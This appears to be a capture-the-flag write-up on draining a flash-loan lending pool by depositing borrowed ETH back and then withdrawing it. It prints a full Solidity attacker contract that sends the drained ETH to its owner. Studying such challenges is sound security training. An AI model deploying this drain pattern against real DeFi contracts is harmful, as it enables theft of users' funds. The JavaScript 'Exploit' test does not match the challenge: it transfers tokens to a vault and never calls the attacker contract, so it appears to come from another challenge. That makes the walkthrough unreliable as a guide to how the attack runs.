# Summary

## Original Contract and Challenge

The SideEntranceLenderPool contract allows users to deposit and withdraw ETH. It also offers free flash loans using the deposited ETH to promote the system. The challenge is to drain all 1000 ETH from the pool, starting with an initial balance of 1 ETH.

## Vulnerability

The vulnerability lies in the `flashLoan()` function of the SideEntranceLenderPool contract. It allows any contract to call its `execute()` function with the loaned amount:

```solidity
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

This is risky because it exposes the contract to potentially malicious implementations of the execute() function.

## Exploit

The exploit involves creating an attacker contract (AttackSideEntrance) with the following functions:

`attack(uint256 amount)`: Calls the `flashLoan()` function in the vulnerable contract to borrow the specified amount, then calls the `withdraw()` function.
`execute()`: Called by the vulnerable contract, this function deposits the borrowed ETH back into the pool, updating the internal balances mapping.
receive(): Transfers the stolen ETH to the attacker's address.

```solidity
contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _chal) {
        pool = SideEntranceLenderPool(_chal);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        owner.transfer(address(this).balance);
    }
}
```

## Deploy the attacker contract.

Call the `attack()` function, borrowing all ETH from the pool and depositing it back.
The vulnerable contract's `flashLoan()` function completes successfully.
The attacker contract's attack() function calls withdraw() to drain all ETH from the pool.

```javascript
it("Exploit", async function () {
  const attackTokenContract = token.connect(player);
  await attackTokenContract.transfer(
    vault.address,
    INITIAL_PLAYER_TOKEN_BALANCE
  );
});
```

## Takeaways

To avoid such vulnerabilities, it is crucial to follow best practices when making external calls and not to trust other contracts blindly. Implementing the transfer execution within the `flashLoan()` function instead of delegating it to an unknown external contract would have made the SideEntranceLenderPool contract more secure.
